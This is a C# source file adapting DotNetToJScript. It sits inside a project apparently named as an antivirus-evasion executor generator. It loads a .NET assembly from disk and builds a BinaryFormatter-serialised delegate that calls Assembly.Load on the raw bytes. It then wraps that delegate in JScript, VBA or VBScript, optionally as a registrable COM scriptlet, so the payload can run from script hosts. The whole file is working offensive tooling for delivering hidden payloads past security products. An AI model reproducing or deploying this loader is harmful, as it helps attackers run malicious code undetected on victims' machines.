using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.Remoting.Messaging;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Xml;
using System.Xml.Schema;

namespace 掩日___免杀执行器生成工具
{
    class DotNetToJScript
    {
        enum ScriptLanguage
        {
            JScript,
            VBA,
            VBScript,
        }

        private const string VERSION = "v1.0.4";

        static object BuildLoaderDelegate(byte[] assembly)
        {
            // Create a bound delegate which will load our assembly from a byte array.
            Delegate res = Delegate.CreateDelegate(typeof(XmlValueGetter),
                assembly,
                typeof(Assembly).GetMethod("Load", new Type[] { typeof(byte[]) }));

            // Create a COM invokable delegate to call the loader. Abuses contra-variance
            // to make an array of headers to an array of objects (which we'll just pass
            // null to anyway).
            return new HeaderHandler(res.DynamicInvoke);
        }

        static object BuildLoaderDelegateMscorlib(byte[] assembly)
        {
            Delegate res = Delegate.CreateDelegate(typeof(Converter<byte[], Assembly>),
                assembly,
                typeof(Assembly).GetMethod("Load", new Type[] { typeof(byte[]), typeof(byte[]) }));

            HeaderHandler d = new HeaderHandler(Convert.ToString);

            d = (HeaderHandler)Delegate.Combine(d, (Delegate)d.Clone());
            d = (HeaderHandler)Delegate.Combine(d, (Delegate)d.Clone());

            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);

            object[] invoke_list = d.GetInvocationList();
            invoke_list[1] = res;
            fi.SetValue(d, invoke_list);

            d = (HeaderHandler)Delegate.Remove(d, (Delegate)invoke_list[0]);
            d = (HeaderHandler)Delegate.Remove(d, (Delegate)invoke_list[2]);

            return d;
        }

        const string DEFAULT_ENTRY_CLASS_NAME = "TestClass";

        static string CreateScriptlet(string script, string script_name, bool register_script, Guid clsid)
        {
            XmlDocument doc = new XmlDocument();
            doc.LoadXml(Global_Var.scriptlet_template);
            XmlWriterSettings settings = new XmlWriterSettings();
            settings.Indent = true;
            settings.NewLineOnAttributes = true;
            settings.Encoding = new UTF8Encoding(false);

            XmlElement reg_node = (XmlElement)doc.SelectSingleNode("/package/component/registration");
            XmlNode root_node = register_script ? reg_node : doc.SelectSingleNode("/package/component");
            XmlNode script_node = root_node.AppendChild(doc.CreateElement("script"));
            script_node.Attributes.Append(doc.CreateAttribute("language")).Value = script_name;
            script_node.AppendChild(doc.CreateCDataSection(script));
            if (clsid != Guid.Empty)
            {
                reg_node.SetAttribute("classid", clsid.ToString("B"));
            }

            using (MemoryStream stm = new MemoryStream())
            {
                using (XmlWriter writer = XmlWriter.Create(stm, settings))
                {
                    doc.Save(writer);
                }
                return Encoding.UTF8.GetString(stm.ToArray());
            }
        }

        static HashSet<string> GetValidClasses(byte[] assembly)
        {
            Assembly asm = Assembly.Load(assembly);
            return new HashSet<string>(asm.GetTypes().Where(t => t.IsPublic && t.GetConstructor(new Type[0]) != null).Select(t => t.FullName));
        }

        static void WriteColor(string str, ConsoleColor color)
        {
            ConsoleColor old_color = Console.ForegroundColor;
            Console.ForegroundColor = color;
            try
            {
                Console.Error.WriteLine(str);
            }
            finally
            {
                Console.ForegroundColor = old_color;
            }
        }

        static void WriteError(string str)
        {
            WriteColor(str, ConsoleColor.Red);
        }

        static void WriteError(string format, params object[] args)
        {
            WriteError(String.Format(format, args));
        }

        static string GetEnumString(Type enum_type)
        {
            return String.Join(", ", Enum.GetNames(enum_type));
        }

        static void ParseEnum<T>(string name, out T value) where T : struct
        {
            value = (T)Enum.Parse(typeof(T), name, true);
        }

        public static string Generate()
        {
            try
            {
                /*
                if (Environment.Version.Major != 2)
                {
                    WriteError("This tool should only be run on v2 of the CLR");
                    Environment.Exit(1);
                }
                */

                string output_file = null;
                string entry_class_name = DEFAULT_ENTRY_CLASS_NAME;
                string additional_script = String.Empty;
                bool mscorlib_only = false;
                bool scriptlet_moniker = false;
                bool scriptlet_uninstall = false;
                bool enable_debug = false;
                RuntimeVersion version = RuntimeVersion.Auto;
                ScriptLanguage language = ScriptLanguage.JScript;
                Guid clsid = Guid.Empty;

                bool show_help = false;
                

                string assembly_path = Global_Var.dll_path;
                /*
                if (!File.Exists(assembly_path) || show_help)
                {
                    Console.Error.WriteLine(@"Usage: DotNetToJScript {0} [options] path\to\asm", VERSION);
                    Console.Error.WriteLine("Copyright (C) James Forshaw 2017. Licensed under GPLv3.");
                    Console.Error.WriteLine("Source code at https://github.com/tyranid/DotNetToJScript");
                    Console.Error.WriteLine("Options");
                    opts.WriteOptionDescriptions(Console.Error);
                    Environment.Exit(1);
                }
                */

                IScriptGenerator generator;
                switch (language)
                {
                    case ScriptLanguage.JScript:
                        generator = new JScriptGenerator();
                        break;
                    case ScriptLanguage.VBA:
                        generator = new VBAGenerator();
                        break;
                    case ScriptLanguage.VBScript:
                        generator = new VBScriptGenerator();
                        break;
                    default:
                        throw new ArgumentException("Invalid script language option");
                }

                byte[] assembly = File.ReadAllBytes(assembly_path);
                try
                {
                    HashSet<string> valid_classes = GetValidClasses(assembly);
                    if (!valid_classes.Contains(entry_class_name))
                    {
                        WriteError("Error: Class '{0}' not found is assembly.", entry_class_name);
                        if (valid_classes.Count == 0)
                        {
                            WriteError("Error: Assembly doesn't contain any public, default constructable classes");
                        }
                        else
                        {
                            WriteError("Use one of the follow options to specify a valid classes");
                            foreach (string name in valid_classes)
                            {
                                WriteError("-c {0}", name);
                            }
                        }
                        Environment.Exit(1);
                    }
                }
                catch (Exception)
                {
                    WriteError("Error: loading assembly information.");
                    WriteError("The generated script might not work correctly");
                }

                BinaryFormatter fmt = new BinaryFormatter();
                MemoryStream stm = new MemoryStream();
                fmt.Serialize(stm, mscorlib_only ? BuildLoaderDelegateMscorlib(assembly) : BuildLoaderDelegate(assembly));

                string script = generator.GenerateScript(stm.ToArray(), entry_class_name, additional_script, version, enable_debug);
                if (scriptlet_moniker || scriptlet_uninstall)
                {
                    if (!generator.SupportsScriptlet)
                    {
                        throw new ArgumentException(String.Format("{0} generator does not support Scriptlet output", generator.ScriptName));
                    }
                    script = CreateScriptlet(script, generator.ScriptName, scriptlet_uninstall, clsid);
                }

                /*
                if (!String.IsNullOrEmpty(output_file))
                {
                    File.WriteAllText(output_file, script, new UTF8Encoding(false));
                }
                else
                {
                    Console.WriteLine(script);
                }
                */
                return script;
            }
            catch (Exception ex)
            {
                ReflectionTypeLoadException tex = ex as ReflectionTypeLoadException;
                if (tex != null)
                {
                    WriteError("Couldn't load assembly file");
                    foreach (var e in tex.LoaderExceptions)
                    {
                        WriteError(e.Message);
                    }
                }
                else
                {
                    WriteError(ex.Message);
                }
                return null;
            }
        }
    }
}
